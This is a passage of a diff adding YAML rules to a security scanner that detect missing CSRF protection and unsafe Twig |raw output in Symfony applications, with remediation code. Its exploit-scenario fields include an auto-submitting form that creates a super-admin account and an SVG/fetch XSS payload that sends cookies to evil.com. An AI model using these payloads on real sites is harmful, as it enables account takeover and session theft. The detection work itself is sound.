+    \       'csrf_token_id' => 'entity_form',\n    ]);\n}\n\n// In Controllers for non-form actions\n#[Route('/delete/{id}', methods: ['POST'])]\npublic function delete(Request $request, int $id): Response\n\
+    {\n    if (!$this->isCsrfTokenValid('delete-item', $request->request->get('_token'))) {\n        throw $this->createAccessDeniedException('Invalid CSRF token.');\n    }\n    // proceed with deletion\n\
+    }\n```\n"
+  references:
+  - https://symfony.com/doc/current/security/csrf.html
+  - https://cwe.mitre.org/data/definitions/352.html
+  - https://owasp.org/Top10/A01_2021-Broken_Access_Control/
+  - https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
+  context_awareness:
+    surrounding_context_patterns:
+    - createForm\s*\(
+    - createFormBuilder\s*\(
+    - handleRequest\s*\(
+    - isSubmitted\s*\(
+    taint_source_indicators:
+    - \$request->request->get
+    - \$request->getContent
+    - \$form->getData
+    taint_sink_indicators:
+    - \$entityManager->persist
+    - \$entityManager->flush
+    - \$entityManager->remove
+    sanitization_patterns:
+    - isCsrfTokenValid\s*\(
+    - csrf_protection.*true
+    - _token
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (financial_actions ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Symfony admin panel has CSRF protection disabled on its user
+
+      management form. An attacker sends a phishing email to an admin
+
+      with a link to a page containing a hidden form that submits a
+
+      POST request to /admin/users/create with role=ROLE_SUPER_ADMIN.
+
+      When the admin clicks the link, the form auto-submits, creating
+
+      a new super admin account the attacker controls.
+
+      '
+    example_payload: <form action="https://target.com/admin/users/create" method="POST"><input type="hidden" name="username" value="attacker"/><input type="hidden" name="role" value="ROLE_SUPER_ADMIN"/><input
+      type="hidden" name="password" value="p@ssw0rd"/></form><script>document.forms[0].submit();</script>
+    attacker_objective: Perform state-changing actions as authenticated admin users via CSRF exploitation
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - FW-SYMFONY-001
+    - FW-SYMFONY-003
+    - FW-ASPNET-001
+    - FW-DJANGO-004
+- rule_id: FW-SYMFONY-003
+  title: Unsafe Twig raw Filter Usage in Symfony Templates
+  description: 'Detects Symfony Twig templates that use the |raw filter or {% autoescape false %} with data that originates from user input, database records, or external APIs. The |raw filter disables
+    Twig''s automatic output escaping, which is the primary defense against XSS in Symfony applications. Using |raw with untrusted data creates XSS vulnerabilities.
+
+    '
+  language: php
+  category: framework_misuse
+  severity: High
+  confidence: 0.9
+  cwe: CWE-79
+  owasp: A03:2021-Injection
+  tags:
+  - symfony
+  - twig
+  - xss
+  - template
+  - raw-filter
+  - php
+  detection_layer: 4
+  attack_surface_type: web
+  patterns:
+  - type: regex
+    pattern: \{\{\s*\w+\.\w+\s*\|\s*raw\s*\}\}
+    description: Twig variable output with raw filter
+  - type: regex
+    pattern: \{\{\s*\w+\s*\|\s*raw\s*\}\}
+    description: Simple variable with raw filter
+  - type: regex
+    pattern: \{%\s*autoescape\s+false\s*%\}
+    description: Autoescape disabled in template block
+  - type: regex
+    pattern: \{\{\s*\w+\.body\s*\|\s*raw\s*\}\}
+    description: Body content output raw (common in CMS)
+  - type: regex
+    pattern: \{\{\s*\w+\.content\s*\|\s*raw\s*\}\}
+    description: Content field output raw
+  - type: regex
+    pattern: \{\{\s*\w+\.description\s*\|\s*raw\s*\}\}
+    description: Description field output raw
+  - type: regex
+    pattern: \{\{\s*app\.request\.\w+\s*\|\s*raw\s*\}\}
+    description: Request data directly output raw
+  - type: regex
+    pattern: \{\{\s*include\s*\(\s*template_from_string\s*\(\s*\w+
+    description: Dynamic template string from variable (SSTI risk)
+  anti_patterns:
+  - \|\s*e\s*\}\}
+  - \|\s*escape\s*\}\}
+  - \|\s*e\s*\(\s*["\x27]html["\x27]\s*\)\s*\}\}
+  - \|\s*striptags\s*\|\s*raw
+  - \|\s*purify\s*\|\s*raw
+  - htmlpurifier
+  - html_purifier\s*\(
+  - \|\s*sanitize\s*\|\s*raw
+  - autoescape\s+true
+  - twig.*autoescape.*true
+  - raw\s*\}\}[\s\S]*?{#\s*sanitized
+  - DOMPurify
+  - \|\s*\w+_sanitize\s*\|\s*raw
+  - bleach
+  - \|\s*clean\s*\|\s*raw
+  bypass_variants:
+  - description: Content sanitized server-side but additional data appended unsanitized
+    pattern: \{\{\s*\w+\s*\|\s*purify\s*~\s*\w+\s*\|\s*raw\s*\}\}
+  - description: Raw used after striptags which does not prevent all XSS
+    pattern: \|\s*striptags\s*\(\s*["\x27]<\w+>["\x27]\s*\)\s*\|\s*raw
+  - description: Raw used with custom filter that does incomplete sanitization
+    pattern: \|\s*\w+_clean\s*\|\s*raw
+  evasion_indicators:
+  - Data flows through Twig extension that does not properly sanitize
+  - Raw filter applied to translated message containing interpolated variables
+  - Content from a trusted source that includes user-generated markup
+  encoding_variants:
+  - type: trans_raw
+    pattern: \{\{\s*["\x27][^"\x27]*%\w+%[^"\x27]*["\x27]\s*\|\s*trans\s*\(\s*\{[^}]*\}\s*\)\s*\|\s*raw
+  - type: format_raw
+    pattern: \{\{\s*["\x27][^"\x27]*["\x27]\s*\|\s*format\s*\(\s*\w+\s*\)\s*\|\s*raw
+  multi_function_chain_patterns:
+  - user.bio -> {{ user.bio|raw }} -> stored XSS in profile page
+  - article.content -> {{ article.content|raw }} -> stored XSS in CMS
+  - app.request.get('q') -> {{ query|raw }} -> reflected XSS in search
+  privilege_context_flags:
+    requires_auth_context: false
+    admin_only_risk: false
+    escalation_vector: XSS via raw filter enables session hijacking and account takeover
+  business_logic_indicator:
+    financial_impact: true
+    data_exposure_risk: true
+    compliance_relevant: true
+  probable_taint_paths:
+  - source: User input (form data, URL parameters, database records)
+    sink: '{{ variable|raw }} in Twig template'
+    through: Controller passing data to template context
+  - source: Database field containing user-generated HTML
+    sink: '{{ entity.field|raw }} in Twig template'
+    through: Doctrine entity passed to template
+  impact: 'Using the |raw filter with untrusted data disables Twig''s automatic
+
+    HTML escaping, allowing attacker-controlled HTML and JavaScript to be
+
+    rendered in the browser. This enables stored XSS (from database
+
+    content), reflected XSS (from request parameters), and DOM-based XSS.
+
+    Attackers can steal session cookies, redirect users, modify page
+
+    content, and perform actions as the victim.
+
+    '
+  remediation: "Avoid |raw with untrusted data; use HTML Purifier for rich content:\n\n```twig\n{# UNSAFE - XSS vulnerability #}\n{# {{ article.content|raw }} #}\n\n{# SAFE - HTML Purifier sanitizes before\
+    \ rendering #}\n{{ article.content|purify }}\n\n{# SAFE - escape (default behavior) #}\n{{ user.name }}\n\n{# For specific HTML attributes #}\n{{ user.website|e('url') }}\n```\n\n```php\n// Install\
+    \ HTML Purifier bundle\n// composer require exercise/htmlpurifier-bundle\n\n// services.yaml\nexercise_html_purifier:\n    default:\n        HTML.Allowed: 'p,b,i,em,strong,a[href|title],ul,li,br'\n\n\
+    // Custom Twig extension\nclass PurifyExtension extends AbstractExtension\n{\n    public function getFilters()\n    {\n        return [\n            new TwigFilter('purify', [$this, 'purify'], ['is_safe'\
+    \ => ['html']]),\n        ];\n    }\n\n    public function purify(string $html): string\n    {\n        return $this->purifier->purify($html);\n    }\n}\n```\n"
+  references:
+  - https://twig.symfony.com/doc/3.x/filters/raw.html
+  - https://symfony.com/doc/current/templates.html#output-escaping
+  - https://cwe.mitre.org/data/definitions/79.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  context_awareness:
+    surrounding_context_patterns:
+    - \|\s*raw
+    - autoescape\s+false
+    - \.html\.twig
+    - \{\{.*\}\}
+    taint_source_indicators:
+    - app\.request\.
+    - \w+\.content
+    - \w+\.body
+    - \w+\.description
+    taint_sink_indicators:
+    - \|\s*raw\s*\}\}
+    - autoescape\s+false
+    - template_from_string
+    sanitization_patterns:
+    - \|\s*purify
+    - \|\s*e\s*\}
+    - \|\s*escape
+    - \|\s*striptags
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: 'severity_weight * confidence * (stored_xss ? 1.5 : 1.0)'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Symfony blog application renders article comments using
+
+      {{ comment.text|raw }} in a Twig template. An attacker posts a
+
+      comment containing:
+
+      <svg onload="fetch(''https://evil.com/steal?c=''+document.cookie)">
+
+      Every user who views the article page has their session cookie
+
+      sent to the attacker''s server. The attacker uses the stolen cookies
+
+      to impersonate users, including administrators.
+
+      '
+    example_payload: <svg/onload="fetch(`https://evil.com/steal?c=${document.cookie}`)">
+    attacker_objective: Inject persistent XSS through the raw template filter to steal user sessions
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  metadata:
+    rule_version: 3.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: framework-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - FW-SYMFONY-001
+    - FW-SYMFONY-002
+    - FW-DJANGO-003
+    - FW-NEXT-004
